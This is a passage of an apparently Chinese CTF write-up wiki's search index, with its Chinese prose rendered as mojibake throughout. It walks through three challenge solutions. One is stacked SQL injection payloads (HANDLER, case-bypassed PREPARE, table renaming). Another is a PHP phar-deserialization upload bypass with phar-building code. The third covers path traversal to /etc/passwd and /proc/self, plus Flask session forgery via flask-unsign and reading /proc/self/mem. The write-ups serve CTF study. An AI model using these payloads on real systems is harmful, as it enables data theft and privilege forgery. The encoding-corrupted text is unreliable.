ç„¶åå¯ä»¥ç”¨å †å æ³¨å…¥ï¼Œæ¥æ˜¾ç¤ºå…¶ä»–ä¿¡æ¯ å†…å®¹å°±åœ¨ # supersqli å†…å®¹å°±åœ¨ 1919810931114514æ€ä¹ˆå¾—åˆ°é‡Œé¢çš„å†…å®¹å‘¢ï¼Ÿ æ–¹æ³•ä¸€ ï¼šä½¿ç”¨handlerHANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚ é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚ é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚ æ–¹æ³•äºŒï¼šä½¿ç”¨é¢„å¤„ç†è¯­å¥setç”¨äºè®¾ç½®å˜é‡åå’Œå€¼prepareç”¨äºé¢„å¤‡ä¸€ä¸ªè¯­å¥ï¼Œå¹¶èµ‹äºˆåç§°ï¼Œä»¥åå¯ä»¥å¼•ç”¨è¯¥è¯­å¥executeæ‰§è¡Œè¯­å¥deallocate prepareç”¨æ¥é‡Šæ”¾æ‰é¢„å¤„ç†çš„è¯­å¥-1;set @sql = CONCAT(se,lect * from `1919810931114514`;);prepare stmt from @sql;EXECUTE stmt;ç»“æœä¸ºstrstr($inject, set) strstr($inject, prepare) è¿™é‡Œæ£€æµ‹åˆ°äº†setå’Œprepareå…³é”®è¯ï¼Œä½†strstrè¿™ä¸ªå‡½æ•°å¹¶ä¸èƒ½åŒºåˆ†å¤§å°å†™ï¼Œæˆ‘ä»¬å°†å…¶å¤§å†™å³å¯ã€‚-1;Set @sql = CONCAT(se,lect * from `1919810931114514`;);Prepare stmt from @sql;EXECUTE stmt; æ–¹æ³•ä¸‰ï¼šä½¿ç”¨rename å’Œ alteræˆ‘ä»¬ä½¿ç”¨renameå’Œalterè¿™ä¸¤ä¸ªå‘½ä»¤æ¥æ›´æ”¹è¡¨åå’Œå­—æ®µåã€‚å› ä¸ºæˆ‘ä»¬å¯ä»¥è®¿é—®wordsé‡Œçš„columnsï¼Œå‘ç°idï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥çš„1é»˜è®¤æ˜¯æŸ¥è¯¢wordsè¿™ä¸ªè¡¨çš„ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠwordsè¡¨æ”¹åæˆwords1è¡¨ï¼ŒæŠŠ1919810931114514è¡¨æ”¹åæˆwordsï¼Œç„¶åå†æŠŠ1919810931114514é‡Œé¢çš„flagå­—æ®µæ”¹åæˆidï¼Œç„¶åè¾“å…¥1â€™ or 1=1#å°±å¯ä»¥æˆåŠŸå¾—åˆ°flagäº†ã€‚ ä¿®æ”¹è¡¨å(å°†è¡¨åuseræ”¹ä¸ºusers)alter table user rename to users;ä¿®æ”¹åˆ—å(å°†å­—æ®µåusernameæ”¹ä¸ºname)alter table users change uesrname name varchar(30);1;alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);ç„¶åä½¿ç”¨ 1 or 1=1"},{"title":"ååºåˆ—åŒ–","path":"/wiki/WP/ååºåˆ—åŒ–/index.html","content":"java æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• php æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½•"},{"title":"pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡","path":"/wiki/WP/æ–‡ä»¶ä¸Šä¼ /pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡.html","content":"ä»€ä¹ˆæ˜¯phar JARæ˜¯å¼€å‘javaç¨‹åºä¸€ä¸ªåº”ç”¨ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„å¯æ‰§è¡Œã€å¯è®¿é—®çš„æ–‡ä»¶éƒ½æ‰“åŒ…è¿›äº†ä¸€ä¸ªJARæ–‡ä»¶é‡Œï¼Œä½¿å¾—éƒ¨ç½²è¿‡ç¨‹ååˆ†ç®€å•ã€‚pharæ˜¯phpé‡Œç±»ä¼¼ä¸JARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚å¯¹äºPHP5.3æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚Pharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œå¯ä»¥ä½¿ç”¨å®ƒã€‚ Pharç»“æ„ stub:pharæ–‡ä»¶çš„æ ‡å¿—ï¼Œå¿…é¡»ä»¥ xxx __HALT_COMPILER();? ç»“å°¾ï¼Œå¦åˆ™æ— æ³•è¯†åˆ«ã€‚xxxå¯ä»¥ä¸ºè‡ªå®šä¹‰å†…å®¹ã€‚ manifest:pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ content:è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ signature (å¯ç©º):ç­¾åï¼Œæ”¾åœ¨æœ«å°¾ã€‚ æ³¨æ„ï¼šPharåè®®è§£ææ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘å¯¹manifestå­—æ®µçš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ– pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡çš„æœ¬è´¨å°±æ˜¯pharååºåˆ—åŒ–ï¼Œåªä¸è¿‡æ˜¯éœ€è¦æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œè¿™ä¸ªæ¡ä»¶æ˜¯éå¸¸è‹›åˆ»çš„ï¼Œè¦å¯¹æ–¹å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«å¹¶ä¸”æ”¯æŒpharä¼ªåè®®ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ ç›´æ¥çœ‹é¢˜å§ ?phphighlight_file(__FILE__);error_reporting(0);class TestObject public function __destruct() include(flag.php); echo $flag; #å¤§è‡´æ„æ€å°±æ˜¯æˆ‘ä»¬è¦ååºåˆ—åŒ–è§¦å‘__destruct()æ–¹æ³•ï¼Œå°±ä¼šè¾“å‡ºflag$filename = $_POST[file];if (isset($filename)) echo md5_file($filename);//postæ¥å—ä¸€ä¸ªæ–‡ä»¶åï¼Œå¦‚æœå­˜åœ¨ä¼šè¿”å›æ–‡ä»¶çš„md5å€¼//upload.php æ–‡ä»¶ä¸Šä¼ é¡µé¢? æˆ‘è¿™é‡Œä¸å¯¹ä»£ç è¿›è¡Œè¿‡å¤šçš„è®²è§£äº†ï¼Œçœ‹æ³¨é‡Šã€‚ è§£é¢˜æ­¥éª¤ï¼š1.ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶â€“2.åœ¨mate-dataé‡Œæ”¾ç½®ä¸€ä¸ªåŒ…å«TestObject()çš„åºåˆ—å·å­—ç¬¦ä¸²â€“3.ä¸Šä¼ æ–‡ä»¶â€“4.md5_fileæ‰§è¡Œpharä¼ªåè®®ï¼Œè§¦å‘ååºåˆ—åŒ–â€“5.ååºåˆ—åŒ–TestObject()è§¦å‘__destruckæ‰§è¡Œecho $flag ç”Ÿæˆpharæ–‡ä»¶ ?phpclass TestObject@unlink(test.phar); //åˆ é™¤ä¹‹å‰çš„test.paræ–‡ä»¶(å¦‚æœæœ‰)$phar=new Phar(test.phar); //åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€$phar-startBuffering(); //å¼€å§‹å†™æ–‡ä»¶$phar-setStub(?php __HALT_COMPILER(); ?); //å†™å…¥stub$o=new TestObject();$phar-setMetadata($o);//å†™å…¥meta-data$phar-addFromString(test.txt,test); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-stopBuffering();? æˆ‘ç”Ÿæˆpharçš„ç¯å¢ƒä½¿ç”¨çš„æ˜¯ è¦åœ¨php.iniä¸­ä¿®æ”¹åœ¨è¿™ä¸ª ç„¶åè®¿é—®æ–‡ä»¶ï¼Œç”ŸæˆpharåŒ…ï¼Œç”±äºæœ‰å¯¹æ–‡ä»¶åç¼€è¿›è¡Œç™½åå•è¿‡æ»¤ï¼Œæ‰€æœ‰ä¿®æ”¹æ–‡ä»¶åç¼€ä¼ªjpg ä¸Šä¼ æ–‡ä»¶ åŒ…å«æ–‡ä»¶ï¼Œè¯»å–flag"},{"title":"æ–‡ä»¶ä¸Šä¼ ","path":"/wiki/WP/æ–‡ä»¶ä¸Šä¼ /index.html","content":"pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"cat_flask+flask_sessionä¼ªé€ ","path":"/wiki/WP/æ–‡ä»¶åŒ…å«/cat_flask+flask_sessionä¼ªé€ .html","content":"å‰ç½®çŸ¥è¯†1. procselfcmdline/proc æ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿ(è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ)ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶å³å½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ”¹å˜å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚/proc/self è¡¨ç¤ºå½“å‰è¿›ç¨‹ç›®å½•ï¼Œlinuxé€šè¿‡/proc/$pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–å½“å‰è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡è¿›ç¨‹$pidæ¥è®¿é—®ï¼Œ/proc/$pid/ç›®å½•ã€‚æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pid.ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº† /proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº /proc/æœ¬è¿›ç¨‹pid/ ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚/proc/self/cmdline è¿™ä¸ªåªè¯»æ–‡ä»¶æ˜¯åŒ…å«äº†è¿›ç¨‹æ‰§è¡Œçš„å®Œæ•´å‘½ä»¤ï¼å¦‚æœæ­¤è¿›ç¨‹æ˜¯ä¸€ä¸ªåƒµå°¸è¿›ç¨‹ï¼Œé‚£ä¹ˆæ¬¡æ–‡ä»¶æ²¡æœ‰ä»»ä½•çš„å†…å®¹ï¼/proc/self/memæ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œé€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜æ•°æ®ã€‚ä½†æ˜¯æ³¨æ„è¯¥æ–‡ä»¶ä¸èƒ½ç›´æ¥è¯»å–ï¼Œå› ä¸ºæ–‡ä»¶ä¸­å­˜åœ¨ç€ä¸€äº›æ— æ³•è¯»å–çš„æœªè¢«æ˜ å°„åŒºåŸŸã€‚æ‰€ä»¥è¦ç»“åˆ/proc/self/mapsä¸­çš„åç§»åœ°å€è¿›è¡Œè¯»å–ã€‚é€šè¿‡å‚æ•°startå’ŒendåŠåç§»åœ°å€å€¼è¯»å–å†…å®¹ã€‚/proc/self/mapsåŒ…å«çš„å†…å®¹æ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œå¯é€šè¿‡è¯»å–è¯¥æ–‡ä»¶æ¥å¾—åˆ°å†…å­˜æ•°æ®æ˜ å°„çš„åœ°å€ã€‚/proc/self/cwdï¼šæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘å½“å‰è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•ã€‚/proc/self/exeï¼šæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚/proc/self/environï¼šåŒ…å«å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚/proc/self/fd/ï¼šæ˜¯ä¸€ä¸ªç›®å½•ï¼ŒåŒ…å«å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„ç¬¦å·é“¾æ¥åˆ—è¡¨. 2. Flaskapp.pyflask_sessionFlask æ˜¯ä¸€ä¸ªè½»é‡çº§çš„ Python Web æ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿå¼€å‘ Web åº”ç”¨ç¨‹åºå’Œ APIã€‚app.py æ˜¯ Flask åº”ç”¨çš„å…¥å£æ–‡ä»¶ï¼Œé€šå¸¸åŒ…å«ä»¥ä¸‹å†…å®¹ï¼šåˆå§‹åŒ– Flask åº”ç”¨ï¼šé€šè¿‡ Flask(__name__) åˆ›å»ºåº”ç”¨å®ä¾‹ï¼Œ__name__ ç”¨äºç¡®å®šèµ„æºè·¯å¾„å’Œè°ƒè¯•ä¿¡æ¯ ã€‚è·¯ç”±å®šä¹‰ï¼šä½¿ç”¨ @app.route è£…é¥°å™¨å°† URL æ˜ å°„åˆ°è§†å›¾å‡½æ•°ï¼Œæ”¯æŒåŠ¨æ€å‚æ•°ï¼ˆå¦‚ int:idï¼‰å’Œè¯·æ±‚æ–¹æ³•ï¼ˆå¦‚ methods=[GET, POST]ï¼‰ã€‚å¯åŠ¨æœåŠ¡å™¨ï¼šé€šè¿‡ app.run(debug=True, host=0.0.0.0, port=5000) å¯åŠ¨å¼€å‘æœåŠ¡å™¨ï¼Œdebug=True å¯ç”¨è°ƒè¯•æ¨¡å¼ ã€‚ flask_session æ˜¯flaskæ¡†æ¶å®ç°sessionåŠŸèƒ½çš„ä¸€ä¸ªæ’ä»¶ã€‚å…¶sessionç»“æ„åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šåºåˆ—åŒ–å†…å®¹+æ—¶é—´+é˜²ç¯¡æ”¹å€¼ï¼Œè¿™ä¸‰éƒ¨åˆ†å†…å®¹åŠ å¯†åä»¥ç¬¦å· â€œ.â€æ¥è¿›è¡Œåˆ†éš”ã€‚flask_sessioné»˜è®¤sessionçš„å‚¨å­˜æ˜¯åœ¨ç”¨æˆ·Cookieä¸­ã€‚ä½†ä¹Ÿå¯ä»¥æŒ‡å®šå­˜å‚¨åœ¨æ•°æ®åº“ï¼Œç¼“å­˜ä¸­é—´ä»¶ï¼ŒæœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç­‰ç­‰ä¹‹ä¸­ã€‚ !!! secret_key æ˜¯ä¿æŠ¤ session ä¸è¢«ç¯¡æ”¹çš„å…³é”®ï¼Œæ²¡æœ‰å®ƒå°±æ— æ³•ä¼ªé€  sessionã€‚ 3.è§£é¢˜é¦–å…ˆçœ‹åˆ°äº†çŒ«çš„ä»‹ç»ï¼Œç‚¹å‡»ç»¿è‰²å­—ä½“å¯ä»¥æŸ¥çœ‹è¯¦æƒ… éšä¾¿ç‚¹ä¸€ä¸ªè¿›å» å‘ç°ç½‘å€é‚£é‡Œä¼¼ä¹å¯ä»¥æ–‡ä»¶åŒ…å« ç„¶åå°è¯•phpä¼ªåè®®ï¼Œphp:input php:fliter data: ç»“æœéƒ½ä¸è¡Œ æ¢ä¸€ä¸ªæ€è·¯ï¼Œè¯•è¯•èƒ½ä¸èƒ½è¯»å–ä¸Šä¸€ä¸ªç›®å½•?file....etcpasswd ,å¯è¡Œï¼Œè¯´æ˜å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ç„¶åæ˜¯è¯»å–ç½‘ç«™æºç ï¼Œå…ˆæŸ¥çœ‹å½“å‰è¿›ç¨‹æ–‡ä»¶ä¿¡æ¯ ....procselfcmdline ç»“æœæ˜¯ bâ€™python\\x00app.py\\x00â€™ æœ‰ä¸ªapp.py è¯´æ˜webæ˜¯pythonçš„flaskæ¡†æ¶åšçš„ å°è¯•è¯»å–app.py ç”±äºä¸çŸ¥é“å®ƒåœ¨é‚£ä¸ªä½ç½®ï¼Œå¯ä»¥å¤šç›®å½•ç©¿è¶Šä¸€æ¬¡ ..app.py è§£ç åè¿™æ®µä»£ç æ˜¯ä¸€ä¸ª **Flask Web åº”ç”¨ç¨‹åº**ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å±•ç¤ºä¸€äº›æ–‡ä»¶å†…å®¹ï¼ˆ`cat` å‘½ä»¤æ¨¡æ‹Ÿï¼‰ï¼Œå¹¶åŒ…å«ä¸€ä¸ªéšè—çš„ `/admin` è·¯ç”±ï¼Œåªæœ‰ç®¡ç†å‘˜ï¼ˆ`session[admin] == 1`ï¼‰æ‰èƒ½è®¿é—® `flag`ã€‚ ## **ä»£ç è§£æ**### **1. åŸºæœ¬è®¾ç½®**```pythonimport osimport uuidfrom flask import Flask, request, session, render_template, Markupfrom cat import cat # å‡è®¾ cat æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰æ¨¡å—ï¼Œç”¨äºè¯»å–æ–‡ä»¶å†…å®¹flag = app = Flask( __name__, static_url_path=/, static_folder=static # é™æ€æ–‡ä»¶ç›®å½•)app.config[SECRET_KEY] = str(uuid.uuid4()).replace(-, ) + *abcdefgh # éšæœºç”Ÿæˆå¯†é’¥if os.path.isfile(/flag): flag = cat(/flag) # è¯»å– flag æ–‡ä»¶å†…å®¹ os.remove(/flag) # åˆ é™¤ flag æ–‡ä»¶ï¼ˆé˜²æ­¢ç›´æ¥è®¿é—®ï¼‰ SECRET_KEYï¼šç”¨äºåŠ å¯† Flask çš„ sessionï¼Œè¿™é‡Œä½¿ç”¨ uuid éšæœºç”Ÿæˆï¼Œå¹¶é™„åŠ  *abcdefghã€‚ flagï¼šå¦‚æœå­˜åœ¨ /flag æ–‡ä»¶ï¼Œè¯»å–å…¶å†…å®¹ååˆ é™¤ï¼ˆé˜²æ­¢ç›´æ¥è®¿é—®ï¼‰ã€‚ 2. è·¯ç”±åŠŸèƒ½(1) é¦–é¡µ /ï¼ˆGET è¯·æ±‚ï¼‰@app.route(/, methods=[GET])def index(): detailtxt = os.listdir(./details/) # åˆ—å‡º ./details/ ç›®å½•ä¸‹çš„æ–‡ä»¶ cats_list = [] for i in detailtxt: cats_list.append(i[:i.index(.)]) # æå–æ–‡ä»¶åï¼ˆå»æ‰æ‰©å±•åï¼‰ return render_template(index.html, cats_list=cats_list, cat=cat) åŠŸèƒ½ï¼šåˆ—å‡º ./details/ ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¹¶æ¸²æŸ“ index.html æ¨¡æ¿ã€‚ cat å‡½æ•°ï¼šå¯èƒ½æ˜¯è‡ªå®šä¹‰çš„æ–‡ä»¶è¯»å–å‡½æ•°ï¼ˆç±»ä¼¼ Linux cat å‘½ä»¤ï¼‰ã€‚ (2) æ–‡ä»¶ä¿¡æ¯ /infoï¼ˆGETPOST è¯·æ±‚ï¼‰@app.route(â€˜infoâ€™, methods[â€œGETâ€, â€˜POSTâ€™])def info(): filename â€œ.detailsâ€œ + request.args.get(â€˜fileâ€™, â€œâ€) # è·å– file å‚æ•° start request.args.get(â€˜startâ€™, â€œ0â€) # è·å– start å‚æ•°ï¼ˆé»˜è®¤ 0ï¼‰ end request.args.get(â€˜endâ€™, â€œ0â€) # è·å– end å‚æ•°ï¼ˆé»˜è®¤ 0ï¼‰ name request.args.get(â€˜fileâ€™, â€œâ€)[:request.args.get(â€˜fileâ€™, â€œâ€).index(â€˜.â€™)] # æå–æ–‡ä»¶åï¼ˆå»æ‰æ‰©å±•åï¼‰ return render_template(detail.html, catname=name, info=cat(filename, start, end)) - **åŠŸèƒ½**ï¼šè¯»å– `./details/file` æ–‡ä»¶å†…å®¹ï¼Œå¹¶æ¸²æŸ“ `detail.html` æ¨¡æ¿ã€‚- **å‚æ•°**ï¼š - `file`ï¼šæ–‡ä»¶åï¼ˆå¦‚ `cat.txt`ï¼‰ã€‚ - `start` å’Œ `end`ï¼šå¯èƒ½æ˜¯æ–‡ä»¶è¯»å–çš„èµ·å§‹å’Œç»“æŸä½ç½®ï¼ˆç±»ä¼¼ `cat filename | head -n end | tail -n +start`ï¼‰ã€‚---#### **(3) ç®¡ç†å‘˜è·¯ç”± `/admin`ï¼ˆGET è¯·æ±‚ï¼‰**```python@app.route(/admin, methods=[GET])def admin_can_list_root(): if session.get(admin) == 1: return flag # åªæœ‰ admin=1 æ‰èƒ½çœ‹åˆ° flag else: session[admin] = 0 # é»˜è®¤è®¾ç½® admin=0 return NoNoNo åŠŸèƒ½ï¼š å¦‚æœ session[admin] == 1ï¼Œè¿”å› flagï¼ˆæ•æ„Ÿä¿¡æ¯ï¼‰ã€‚ å¦åˆ™ï¼Œè¿”å› NoNoNoï¼Œå¹¶è®¾ç½® session[admin] = 0ã€‚ æ¼æ´ï¼šsession å¯ä»¥è¢«ä¼ªé€ ï¼ˆå¦‚æœ SECRET_KEY å¯é¢„æµ‹æˆ–æ³„éœ²ï¼‰ã€‚ 3. å¯åŠ¨ Flask æœåŠ¡å™¨if __name__ == __main__: app.run(host=0.0.0.0, debug=False, port=5637) ç›‘å¬ï¼š0.0.0.0:5637ï¼ˆæ‰€æœ‰ç½‘ç»œæ¥å£ï¼‰ã€‚ debug=Falseï¼šç”Ÿäº§æ¨¡å¼ï¼ˆä¸æš´éœ²è°ƒè¯•ä¿¡æ¯ï¼‰ã€‚ å®‰å…¨åˆ†æ1. å¦‚ä½•è·å– flagï¼Ÿ ç›®æ ‡ï¼šè®© session[admin] == 1ã€‚ æ–¹æ³•ï¼š ä¼ªé€  sessionï¼š å¦‚æœ SECRET_KEY å¯é¢„æµ‹ï¼ˆå¦‚ uuid + *abcdefghï¼‰ï¼Œå¯ä»¥ç”Ÿæˆæ¶æ„ sessionã€‚ ä½¿ç”¨ flask-unsign å·¥å…·ä¼ªé€ ï¼šflask-unsign --sign --cookie admin: 1 --secret SECRET_KEY ç›´æ¥è®¿é—® /flagï¼š ä½†ä»£ç å·²ç»åˆ é™¤ /flag æ–‡ä»¶ï¼ˆos.remove(/flag)ï¼‰ï¼Œæ‰€ä»¥ä¸è¡Œã€‚ 2. å¯èƒ½çš„æ¼æ´ SECRET_KEY å¯é¢„æµ‹ï¼š ä½¿ç”¨ uuid.uuid4() ç”Ÿæˆï¼Œä½†é™„åŠ äº†å›ºå®šå­—ç¬¦ä¸² *abcdefghã€‚ å¦‚æœæœåŠ¡å™¨é‡å¯å SECRET_KEY ä¸å˜ï¼Œå¯ä»¥çˆ†ç ´æˆ–é¢„æµ‹ã€‚ cat å‘½ä»¤æ³¨å…¥ï¼ˆå¦‚æœ startend æœªè¿‡æ»¤ï¼‰ï¼š å¦‚æœ cat å‡½æ•°ç›´æ¥æ‹¼æ¥å‚æ•°ï¼Œå¯èƒ½å¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼ˆå¦‚ start=0; cat /etc/passwdï¼‰ã€‚ ç›®å½•éå†ï¼ˆPath Traversalï¼‰ï¼š request.args.get(file) æœªæ£€æŸ¥è·¯å¾„ï¼Œå¯èƒ½è¯»å–ä»»æ„æ–‡ä»¶ï¼ˆå¦‚ ../../etc/passwdï¼‰ã€‚ æ€»ç»“ æ ¸å¿ƒåŠŸèƒ½ï¼šä¸€ä¸ªç®€å•çš„æ–‡ä»¶æŸ¥çœ‹ Web åº”ç”¨ï¼ŒåŒ…å«éšè—çš„ /admin è·¯ç”±ã€‚ å®‰å…¨é£é™©ï¼š session å¯èƒ½è¢«ä¼ªé€ ï¼ˆå¦‚æœ SECRET_KEY æ³„éœ²ï¼‰ã€‚ file å‚æ•°å¯èƒ½å¯¼è‡´ç›®å½•éå†ã€‚ startend å‚æ•°å¯èƒ½å¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼ˆå–å†³äº cat å®ç°ï¼‰ã€‚ æ”»å‡»æ€è·¯ï¼š ä¼ªé€  session ä½¿ admin=1ã€‚ å°è¯•è¯»å– /flagï¼ˆä½†å·²è¢«åˆ é™¤ï¼‰ã€‚ æ£€æŸ¥ cat å‡½æ•°æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚ ### å…³æ³¨åˆ°adminè·¯ç”±å¯ä»¥è·å–flagï¼Œä½†æ˜¯éœ€è¦å®Œæˆsessionä¼ªé€ ï¼Œéœ€è¦ä¼ªé€ å†…å®¹ä¸º`admin : 1`çš„sessionï¼Œåˆ™éœ€è¦è·å–secret key```python@app.route(/admin, methods=[GET])def admin_can_list_root(): if session.get(admin) == 1: return flag else: session[admin] = 0 return NoNoNosecret key: app.config[SECRET_KEY] = str(uuid.uuid4()).replace(-, ) + *abcdefgh æ³¨æ„åˆ°æ–‡ä»¶è¯»å–åŠŸèƒ½æ˜¯infoæä¾›çš„å¯æ§å‚æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯fileï¼Œstartå’Œendè¿˜æ³¨æ„åˆ°å…¶ä¸­æœ‰ä¸ªcatå‡½æ•°@app.route(/info, methods=[GET, POST])def info(): filename = ./details/ + request.args.get(file, ) start = request.args.get(start, 0) end = request.args.get(end, 0) name = request.args.get(file, )[:request.args.get(file, ).index(.)] return render_template(detail.html, catname=name, info=cat(filename, start, end)) åˆ†ææºç å¯çŸ¥catå‡½æ•°ç”±cat.pyæä¾› :from cat import catè·å–cat.pyimport os, sys, getoptdef cat(filename, start=0, end=0)-bytes: data = b try: start = int(start) end = int(end) except: start=0 end=0 if filename != and os.access(filename, os.R_OK): f = open(filename, rb) if start = 0: f.seek(start) if end = start and end != 0: data = f.read(end-start) else: data = f.read() else: data = f.read() f.close() else: data = (File `%s` not exist or can not be read % filename).encode() return dataif __name__ == __main__: opts,args = getopt.getopt(sys.argv[1:],-h-f:-s:-e:,[help,file=,start=,end=]) fileName = start = 0 end = 0 for opt_name, opt_value in opts: if opt_name == -h or opt_name == --help: print([*] Help) print(-f --file File name) print(-s --start Start position) print(-e --end End position) print([*] Example of reading /etc/passwd) print(python3 cat.py -f /etc/passwd) print(python3 cat.py --file /etc/passwd) print(python3 cat.py -f /etc/passwd -s 1) print(python3 cat.py -f /etc/passwd -e 5) print(python3 cat.py -f /etc/passwd -s 1 -e 5) exit() elif opt_name == -f or opt_name == --file: fileName = opt_value elif opt_name == -s or opt_name == --start: start = opt_value elif opt_name == -e or opt_name == --end: end = opt_value if fileName != : print(cat(fileName, start, end)) else: print(No file to read) çœ‹åˆ°äº†start å’Œ end ï¼ˆæ–¹ä¾¿è¯»å–å†…å­˜ä¸­ä¿¡æ¯ï¼‰è·å–secret keyè¿™é‡Œå¯ä»¥åˆ©ç”¨pythonå­˜å‚¨å¯¹è±¡çš„ä½ç½®åœ¨å †ä¸Šè¿™ä¸ªç‰¹æ€§ï¼Œappæ˜¯å®ä¾‹åŒ–çš„Flaskå¯¹è±¡ï¼Œè€Œsecret keyåœ¨app.config[SECRET_KEY]ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¯»å–/proc/self/memæ¥è¯»å–secret key è¯»å–å †æ 